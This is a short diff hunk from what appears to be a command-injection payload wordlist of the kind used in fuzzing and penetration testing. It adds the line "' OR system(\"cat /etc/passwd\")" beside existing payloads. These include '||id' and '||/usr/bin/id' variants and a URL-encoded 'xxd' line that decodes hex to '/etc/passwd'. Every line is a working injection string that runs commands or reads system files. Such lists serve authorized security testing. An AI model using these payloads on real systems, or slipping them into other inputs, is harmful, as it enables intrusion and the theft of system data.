@@ -1032,3 +1032,4 @@ xxd%20-r%20-ps%20%3C%28echo%202f6574632f706173737764%29
 ||/usr/bin/id;
 ||/usr/bin/id|
 ||id
+' OR system("cat /etc/passwd")
